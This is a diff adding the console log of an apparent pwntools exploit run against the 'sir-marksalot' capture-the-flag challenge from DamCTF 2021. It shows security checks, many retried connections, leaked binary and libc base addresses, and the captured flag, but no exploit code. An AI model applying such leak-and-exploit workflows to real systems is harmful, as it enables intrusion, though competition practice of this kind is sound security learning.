@@ -1,0 +1,177 @@
+# ./exploit.py REMOTE=1
+[*] '/pwd/datajerk/damctf2021/sir-marksalot/sir-marksalot'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] '/pwd/datajerk/damctf2021/sir-marksalot/libc6_2.27-3ubuntu1.4_amd64.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] pass 1
+[*] rand 4,22
+[*] grue at 17,40
+[CRITICAL] grue on edge
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 19,31
+[*] grue at 39,37
+[*] time check: 7.619574785232544s
+[CRITICAL] cannot backtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 37,20
+[*] grue at 22,16
+[*] time check: 6.176785230636597s
+[*] leak: 0x555569290217
+[*] binary.address: 0x55556928f000
+[*] time check: 7.751788854598999s
+[*] time check: 19.010509252548218s
+[*] leak: 0x7f920c144aa0
+[*] libc.address: 0x7f920c0c4000
+[CRITICAL] cannot forwardtrack 4 libc
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 32,22
+[*] grue at 28,31
+[*] time check: 6.610724925994873s
+[CRITICAL] cannot backtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 29,8
+[*] grue at 22,6
+[*] time check: 11.746458768844604s
+[CRITICAL] cannot backtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 16,23
+[*] grue at 29,15
+[*] time check: 11.55675721168518s
+[CRITICAL] cannot backtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 1,31
+[*] grue at 6,7
+[*] time check: 12.611099243164062s
+[CRITICAL] cannot backtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 32,28
+[*] grue at 10,17
+[*] time check: 5.097243547439575s
+[*] leak: 0x559308e40217
+[*] binary.address: 0x559308e3f000
+[CRITICAL] cannot forwardtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 20,12
+[*] grue at 32,33
+[*] time check: 12.048992395401001s
+[*] leak: 0x564658562217
+[*] binary.address: 0x564658561000
+[CRITICAL] cannot backtrack 2
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 22,27
+[*] grue at 1,6
+[*] time check: 8.634657859802246s
+[*] leak: 0x55d22a9f0217
+[*] binary.address: 0x55d22a9ef000
+[CRITICAL] cannot backtrack 2
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 14,28
+[*] grue at 3,25
+[*] time check: 10.250229835510254s
+[*] leak: 0x564a3bc37217
+[*] binary.address: 0x564a3bc36000
+[CRITICAL] cannot backtrack 2
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 23,24
+[*] grue at 22,37
+[*] time check: 8.353588342666626s
+[CRITICAL] cannot backtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 25,21
+[*] grue at 28,5
+[*] time check: 8.94172477722168s
+[*] leak: 0x55c674e9a217
+[*] binary.address: 0x55c674e99000
+[CRITICAL] cannot backtrack 2
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 34,25
+[*] grue at 20,6
+[*] time check: 6.119905233383179s
+[*] leak: 0x55ff55ff7217
+[*] binary.address: 0x55ff55ff6000
+[*] time check: 7.58597469329834s
+[*] time check: 22.650233268737793s
+[*] leak: 0x7f8ca3f4caa0
+[*] libc.address: 0x7f8ca3ecc000
+[CRITICAL] cannot backtrack 2 libc
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 15,6
+[*] grue at 16,13
+[*] time check: 15.37161898612976s
+[*] leak: 0x557c18d05217
+[*] binary.address: 0x557c18d04000
+[CRITICAL] cannot backtrack 2
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 22,15
+[*] grue at 23,17
+[*] time check: 10.870380878448486s
+[*] leak: 0x55b430f25217
+[*] binary.address: 0x55b430f24000
+[CRITICAL] cannot backtrack 2
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 38,5
+[*] grue at 37,32
+[*] time check: 9.407131433486938s
+[CRITICAL] cannot backtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 4,27
+[*] grue at 2,36
+[*] time check: 12.437431573867798s
+[*] leak: 0x556fe65cb217
+[*] binary.address: 0x556fe65ca000
+[*] time check: 13.862141609191895s
+[*] time check: 24.520526885986328s
+[*] leak: 0x7f6ff6a74aa0
+[*] libc.address: 0x7f6ff69f4000
+[*] pass 2
+[*] x,y = 11,20
+[*] rand 11,20
+[*] grue at 11,33
+[*] time check: 36.92450523376465s
+[*] time check: 38.24133801460266s
+[*] time check: 47.336644887924194s
+dam{1n73N710N4LLy_93771n9_3473n_8y_4_9rU3-7H47_w42_9Ru3S0M3}
